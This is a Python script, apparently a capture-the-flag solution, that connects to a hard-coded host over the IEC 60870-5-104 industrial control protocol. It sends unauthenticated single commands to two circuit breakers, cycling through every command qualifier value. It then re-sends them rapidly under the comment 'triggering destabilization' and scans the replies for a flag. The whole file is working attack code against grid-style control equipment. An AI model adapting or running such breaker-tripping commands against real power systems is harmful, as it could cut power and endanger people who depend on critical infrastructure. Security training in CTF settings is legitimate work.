#!/usr/bin/env python3
import socket
import time

HOST = '169.58.126.107'
PORT = 6004

def main():
    s = socket.socket()
    s.settimeout(300)
    try:
        s.connect((HOST, PORT))
        # STARTDT
        s.send(bytes([0x68, 0x04, 0x07, 0x00, 0x00, 0x00]))
        time.sleep(2)
        r = s.recv(1024)
        print(r.hex() if r else 'none')
        ca = bytes([0x01, 0x00])
        tx = rx = 0
        def send_i(asdu):
            nonlocal tx, rx
            apci = bytes([0x68, len(asdu)+4, tx&0xFF,(tx>>8)&0xFF, rx&0xFF,(rx>>8)&0xFF])
            tx += 2; rx += 2
            s.send(apci+asdu)
        # Try both breakers with all SCO values
        for ioa_num in [1, 2]:
            ioa = bytes([ioa_num&0xFF,(ioa_num>>8)&0xFF,(ioa_num>>16)&0xFF])
            for sco in [0x00, 0x01, 0x02, 0x03, 0x80, 0x81, 0x82, 0x83]:
                asdu = bytes([45, 0x01, 0x06, 0x00]) + ca + ioa + bytes([sco])
                send_i(asdu)
                time.sleep(0.5)
                try:
                    r2 = s.recv(128)
                    if r2 and r2 != bytes([0x68,0x04,0x43,0x00,0x00,0x00]): # skip testfr
                        print(f'IOA{ioa_num} SCO{hex(sco)}: {r2.hex()}')
                except:
                    pass
        print('triggering destabilization...')
        # Send both again rapidly
        for _ in range(3):
            for ioa_num in [1,2]:
                ioa = bytes([ioa_num&0xFF,(ioa_num>>8)&0xFF,(ioa_num>>16)&0xFF])
                asdu = bytes([45, 0x01, 0x06, 0x00]) + ca + ioa + bytes([0x81])
                send_i(asdu)
            time.sleep(0.1)
        start = time.time()
        while time.time() - start < 240:
            try:
                s.settimeout(30)
                r = s.recv(16384)
                if not r: break
                print('===', r.hex())
                if b'CTF{' in r:
                    print(r)
                    break
                # try to find flag
                if b'{' in r and b'}' in r:
                    print(r)
            except socket.timeout:
                try: s.send(bytes([0x68,0x04,0x43,0x00,0x00,0x00]))
                except: break
                continue
            except Exception as e:
                print(e)
                break
    finally:
        try: s.close()
        except: pass

if __name__ == '__main__':
    main()
